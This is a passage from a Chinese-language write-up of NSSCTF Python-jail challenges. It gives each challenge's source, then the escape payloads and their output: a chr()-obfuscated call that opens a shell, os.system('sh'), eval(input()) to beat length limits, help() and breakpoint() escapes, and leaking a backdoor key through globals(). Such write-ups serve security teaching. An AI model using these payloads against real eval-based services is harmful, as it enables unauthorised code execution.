class="number">95</span>)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">flag  server.py</span></span><br><span class="line"><span class="string">$ cat flag</span></span><br><span class="line"><span class="string">flag=NSSCTF&#123;00711634-832d-437e-be7a-d98793070bdc&#125;</span></span><br></pre></td></tr></table></figure>
<p>得到flag。</p>
<p>实际上，如果我们已知题目文件叫flag，可以用<code>chr</code>和<code>open</code>操作直接读：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">103</span>)).read())</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level2">calc_jail_beginner_level2</h4>
<p>you finish beginner challenge level1.Let’s play an challenge of level2</p>
<p>Now that the length is limited, can u escape this jail?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#the length is be limited less than 13</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ ___  </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | |__ \ </span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / / </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_ </span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                    </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                            </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
<p>题目限制了我们的输入长度，这里用到一种叫做<strong>参数逃逸</strong>的手法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br></pre></td></tr></table></figure>
<p>使用这个操作可以直接重新调用一次<code>input()</code>，本题的长度检测机制检测的是输入的<code>input_data</code>，跟我们再调用进行<code>eval</code>执行的语句长度无关，所以接下来就可以直接读flag了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">&gt; eval(input())</span></span><br><span class="line"><span class="string">print(open(&#x27;</span>flag<span class="string">&#x27;).read())</span></span><br><span class="line"><span class="string">flag=NSSCTF&#123;25e8054e-3ee4-4b08-8096-37ad660e5165&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Answer: None</span></span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level3">calc_jail_beginner_level3</h4>
<p>you finish beginner challenge level2.Let’s play an challenge of level3</p>
<p>Now that the length is limited than level2, can u escape this jail?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ ____  </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | |___ \ </span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ &lt; </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/ </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                     </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                       </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"><span class="comment">#the length is be limited less than 7</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">7</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
<p>题目限定了长度只有7，之前的方法也不能用了。这题思路是利用<code>help()</code>进入help界面，在某个模块里直接输入<code>!</code><strong>前缀后接命令即可直接执行系统命令</strong>。</p>
<blockquote>
<p>这个方法在很多题目里实际上会被ban掉。</p>
</blockquote>
<p>比如输入<code>os</code>查询界面，接下来输入<code>! cat flag</code>即可直接得到flag：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"> |  Methods defined here:</span><br><span class="line"> |</span><br><span class="line">--More--! cat flag</span><br><span class="line">! cat flag</span><br><span class="line">flag=NSSCTF&#123;f3ca28df-a0c2-4156-a789-73bb7dfb5365&#125;</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level2-5">calc_jail_beginner_level2.5</h4>
<p>level2 seems have some unintend soluntion</p>
<p>level2.5 is out.Let’s Avenger</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#the length is be limited less than 13</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#banned some unintend sol</span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    BLACKLIST = [<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;eval&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i!r&#125;</span> has been banned for security reasons&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _ _                _ ___    _____ </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | |              | |__ \  | ____|</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  </span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                          </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                                            </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">filter</span>(input_data)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
<p>发现在level2的基础上进一步进行了约束，之前的方法不能用了。尝试使用level3的help，简单操作了一下发现得不到flag。</p>
<p>题目用到了另一个<code>breakpoint()</code>这个函数。这个函数可以进入Pdb，是一个python的debug调试器，可以在上下文中直接运行python代码。</p>
<p>进入pdb之后直接一句话RCE即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">&gt; breakpoint()</span></span><br><span class="line"><span class="string">--Return--</span></span><br><span class="line"><span class="string">&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;None</span></span><br><span class="line"><span class="string">(Pdb) open(&#x27;</span>flag<span class="string">&#x27;).read()</span></span><br><span class="line"><span class="string">&#x27;</span>flag=NSSCTF&#123;e6b11ec7-86fc-4169-96ca-baa9f18ed202&#125;\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">(Pdb)</span></span><br></pre></td></tr></table></figure>
<h4 id="python2-input">python2 input</h4>
<p>Let’s have a rest,Did u like the challenge of python2 but it only have an input function.</p>
<p>Can u read the flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># It&#x27;s escape this repeat!</span></span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">              _   _      ___        ___    _____             _    _ _   </span></span><br><span class="line"><span class="string">             | | | |    / _ \      |__ \  |_   _|           | |  | | |  </span></span><br><span class="line"><span class="string">  _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_ </span></span><br><span class="line"><span class="string"> | &#x27;_ \| | | | __| &#x27;_ \| | | | &#x27;_ \  / /    | | | &#x27;_ \| &#x27;_ \| |  | | __|</span></span><br><span class="line"><span class="string"> | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_ </span></span><br><span class="line"><span class="string"> | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|</span></span><br><span class="line"><span class="string"> | |     __/ |                                        | |               </span></span><br><span class="line"><span class="string"> |_|    |___/                                         |_|                               </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> WELCOME</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Welcome to the python jail&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;But this program will repeat your messages&quot;</span></span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span> input_data</span><br></pre></td></tr></table></figure>
<p>没怎么研究过python2……</p>
<p>通过<code>print WELCOME</code>这种写法判定为这是python2的程序。了解一下python2的特性：</p>
<p>在python 2中，<code>input</code>函数从标准输入接收输入，并且自动<code>eval</code>求值，返回求出来的值；</p>
<p>在python 2中，<code>raw_input</code>函数从标准输入接收输入，返回输入字符串；</p>
<p>在python 3中，<code>input</code>函数从标准输入接收输入，返回输入字符串。</p>
<p>也就是说，以下几个代码是等价的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">input</span>() <span class="comment">#python2</span></span><br><span class="line"><span class="built_in">eval</span>(raw_input()) <span class="comment">#python2</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">input</span>()) <span class="comment">#python3</span></span><br></pre></td></tr></table></figure>
<p>题目直接使用了python2的input，所以直接一句话RCE得到flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">__import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">plaintext</span><br><span class="line">Welcome to the python jail</span><br><span class="line">But this program will repeat your messages</span><br><span class="line">&gt; __import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">flag  server.py</span></span><br><span class="line"><span class="string">$ cat flag</span></span><br><span class="line"><span class="string">flag=NSSCTF&#123;8b9343ae-b657-4308-8610-a61bc6b829c9&#125;</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>
<h4 id="lake-lake-lake">lake lake lake</h4>
<p>Cool job of u finished level3</p>
<p>Now it’s time for level4,Try to leak the key!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#it seems have a backdoor</span></span><br><span class="line"><span class="comment">#can u find the key of it and use the backdoor</span></span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = <span class="string">&quot;[DELETED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nooo!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _       _          _       _          _       _        </span></span><br><span class="line"><span class="string"> | |     | |        | |     | |        | |     | |       </span></span><br><span class="line"><span class="string"> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ </span></span><br><span class="line"><span class="string"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \</span></span><br><span class="line"><span class="string"> | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/</span></span><br><span class="line"><span class="string"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Now the program has two functions&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;can you use dockerdoor&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1.func&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2.backdoor&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input_data == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    func()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span>(input_data == <span class="string">&quot;2&quot;</span>):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found the choice&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>题目中提到了一个<code>fake_key_var_in_the_local_but_real_in_the_remote = &quot;[DELETED]&quot;</code>。</p>
<p>想到查找全局变量找到这个真正的key，使用<code>globals()</code>得到全局变量中的key，然后用backdoor函数一句话RCE即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Now the program has two <span class="built_in">functions</span></span><br><span class="line">can you use dockerdoor</span><br><span class="line">1.func</span><br><span class="line">2.backdoor</span><br><span class="line">&gt; 1</span><br><span class="line">&gt;<span class="function"><span class="title">globals</span></span>()</span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: None, <span class="string">&#x27;__package__&#x27;</span>: None, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fc3fb2a4a90&gt;, <span class="string">&#x27;__spec__&#x27;</span>: None, <span class="string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-in)&gt;, <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;/home/ctf/./server.py&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>: None, <span class="string">&#x27;key_9b1d015375213e21&#x27;</span>: <span class="string">&#x27;a34af94e88aed5c34fb5ccfe08cd14ab&#x27;</span>, <span class="string">&#x27;func&#x27;</span>: &lt;<span class="keyword">function</span> func at 0x7fc3fb43fd90&gt;, <span class="string">&#x27;backdoor&#x27;</span>: &lt;<span class="keyword">function</span> backdoor at 0x7fc3fb305fc0&gt;, <span class="string">&#x27;WELCOME&#x27;</span>: <span class="string">&#x27;\n  _       _          _       _          _       _        \n | |     | |        | |     | |        | |     | |       \n | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ \n | |/ _` | |/ / _ \\ | |/ _` | |/ / _ \\ | |/ _` | |/ / _  | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/\n |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            \n&#x27;</span>, <span class="string">&#x27;input_data&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">Now the program has two <span class="built_in">functions</span></span><br><span class="line">can you use dockerdoor</span><br><span class="line">1.func</span><br><span class="line">2.backdoor</span><br><span class="line">&gt; 2</span><br><span class="line">Please enter the admin key</span><br><span class="line">&gt;a34af94e88aed5c34fb5ccfe08cd14ab</span><br><span class="line">&gt;open(<span class="string">&#x27;flag&#x27;</span>).<span class="built_in">read</span>()</span><br><span class="line">flag=NSSCTF&#123;04c4c4a2-79bf-4cb5-9d1a-20583a32845e&#125;</span><br></pre></td></tr></table></figure>
<h4 id="l-ke-l-ke-l-ke">l@ke l@ke l@ke</h4>
<p>seems u finished lake lake lake</p>
<p>Let’s have a try on l@ke l@ke l@ke</p>
<p>G00d luck!!!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#it seems have a backdoor as `lake lake lake`</span></span><br><span class="line"><span class="comment">#but it seems be limited!</span></span><br><span class="line"><span class="comment">#can u find the key of it and use the backdoor</span></span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = <span class="string">&quot;[DELETED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nooo!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _         _          _         _          _         _        </span></span><br><span class="line"><span class="string"> | |  ____ | |        | |  ____ | |        | |  ____ | |       </span></span><br><span class="line"><span class="string"> | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____ </span></span><br><span class="line"><span class="string"> | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \</span></span><br><span class="line"><span class="string"> | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/</span></span><br><span class="line"><span class="string"> |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|</span></span><br><span class="line"><span class="string">     \____/               \____/               \____/                                                                                                                                                                                                                                        </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Now the program has two functions&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;can you use dockerdoor&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1.func&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2.backdoor&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input_data == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    func()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span>(input_data == <span class="string">&quot;2&quot;</span>):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found the choice&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>看到<code>len(code)&gt;6</code>估计又是从<code>help()</code>里去拿，发现直接用<code>! sh</code>进入不到shell里，又注意到help里有这么一段话：</p>
<p>Enter the name of any module, keyword, or topic to get help on writing Python programs and using Python modules. To quit this help utility and return to the interpreter, just type “quit”.</p>
<p>To get a list of available modules, keywords, symbols, or topics, type<br>
“modules”, “keywords”, “symbols”, or “topics”. Each module also comes<br>
with a one-line summary of what it does; to list the modules whose name<br>
or summary contain a given string such as “spam”, type “modules spam”.</p>
<p>在python的help中，如果我们输入<code>__main__</code>可以得到当前模块的帮助，能得到当前模块的信息，包括全局变量。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">NAME</span><br><span class="line">    __main__</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">    #it seems have a backdoor as `lake lake lake`</span><br><span class="line">    #but it seems be limited!</span><br><span class="line">    #can u find the key of it and use the backdoor</span><br><span class="line"></span><br><span class="line">FUNCTIONS</span><br><span class="line">    backdoor()</span><br><span class="line"></span><br><span class="line">    func()</span><br><span class="line"></span><br><span class="line">DATA</span><br><span class="line">    WELCOME = &#x27;\n  _         _          _         _          _  ...       ...</span><br><span class="line">    __annotations__ = &#123;&#125;</span><br><span class="line">    input_data = &#x27;1&#x27;</span><br><span class="line">    key_9d38ee7f31d6126d = &#x27;95c720690c2c83f0982ffba63ff87338&#x27;</span><br><span class="line"></span><br><span class="line">FILE</span><br><span class="line">    /home/ctf/server.py</span><br></pre></td></tr></table></figure>
<p>发现得到了key，拿到flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Now the program has two <span class="built_in">functions</span></span><br><span class="line">can you use dockerdoor</span><br><span class="line">1.func</span><br><span class="line">2.backdoor</span><br><span class="line">&gt; 2</span><br><span class="line">Please enter the admin key</span><br><span class="line">&gt;95c720690c2c83f0982ffba63ff87338</span><br><span class="line">&gt;__import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">flag=NSSCTF&#123;6a895fc7-2871-4496-a0d7-f0a5e6873f6c&#125;</span><br><span class="line">0</span><br><span class="line">problem <span class="keyword">in</span> server - SystemExit: 0</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level5">calc_jail_beginner_level5</h4>
<p>level5 is so easy challenge</p>
<p>Let’s have nice idea to leak my flag</p>
<p>这题没有给附件，先连一下环境：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">It&#x27;s so easy challenge!</span><br><span class="line">Seems flag into the dir()</span><br></pre></td></tr></table></figure>
<p>尝试使用一句话RCE，发现过了，直接拿flag。ls发现这题有好几个文件：</p>
